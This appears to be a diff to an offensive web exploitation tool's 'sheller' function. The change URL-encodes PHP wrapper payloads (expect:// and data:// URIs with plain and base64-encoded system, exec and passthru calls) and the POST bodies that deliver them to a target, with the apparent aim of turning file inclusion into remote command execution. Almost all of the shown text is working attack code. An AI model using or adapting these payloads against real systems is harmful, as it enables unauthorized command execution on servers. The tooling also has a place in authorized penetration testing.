@@ -48,7 +48,7 @@ from core.methods.list import filegen
 from core.methods.notify import notify
 from core.methods.error import ShellPopException
 
-from urllib.parse import unquote
+from urllib.parse import unquote, quote
 
 global maxlen
 maxlen = len(max(payloadlist, key=len))
@@ -1117,23 +1117,29 @@ def sheller(
             nullbyte_used = ""
             if nullist:
                 nullbyte_used = nullist[0]
+            systemp = '<?php system("{}"); ?>'.format(PAYLOAD)
+            execp = '<?php exec("{}"); ?>'.format(PAYLOAD)
+            passp = '<?php passthru("{}"); ?>'.format(PAYLOAD)
             wrappersPart1 = [
-                'expect://{}'.format(PAYLOAD),
-                'data://text/plain,<?php system'
-                '("{}"); ?>'.format(PAYLOAD),
-                'data://text/plain,<?php exec'
-                '("{}"); ?>'.format(PAYLOAD),
-                'data://text/plain,<?php passthru'
-                '("{}"); ?>'.format(PAYLOAD),
-                'data://text/plain;base64,' + encode64(
+                'expect://{}'.format(quote(PAYLOAD)),
+                'data://text/plain,{}'.format(
+                    quote(systemp),
+                ),
+                'data://text/plain,{}'.format(
+                    quote(execp),
+                ),
+                'data://text/plain,{}'.format(
+                    quote(passp),
+                ),
+                'data://text/plain;base64,' + quote(encode64(
                     '<?php system("{}"); ?>'.format(PAYLOAD)
-                ),
-                'data://text/plain;base64,' + encode64(
+                )),
+                'data://text/plain;base64,' + quote(encode64(
                     '<?php exec("{}"); ?>'.format(PAYLOAD)
-                ),
-                'data://text/plain;base64,' + encode64(
+                )),
+                'data://text/plain;base64,' + quote(encode64(
                     '<?php passthru("{}"); ?>'.format(PAYLOAD)
-                )
+                )),
             ]
 
             namesPart1 = [
@@ -1234,7 +1240,7 @@ def sheller(
                     req = requests.Request(
                         method="POST",
                         url=url + cont,
-                        data=payloads[i]
+                        data=quote(payloads[i])
                     )
                     prep = s.prepare_request(req)
                 elif attack == 3:
@@ -1242,7 +1248,7 @@ def sheller(
                     req = requests.Request(
                         method="POST",
                         url=url + cont,
-                        data=payloads[i]
+                        data=quote(payloads[i])
                     )
                     prep = s.prepare_request(req)
                 else:
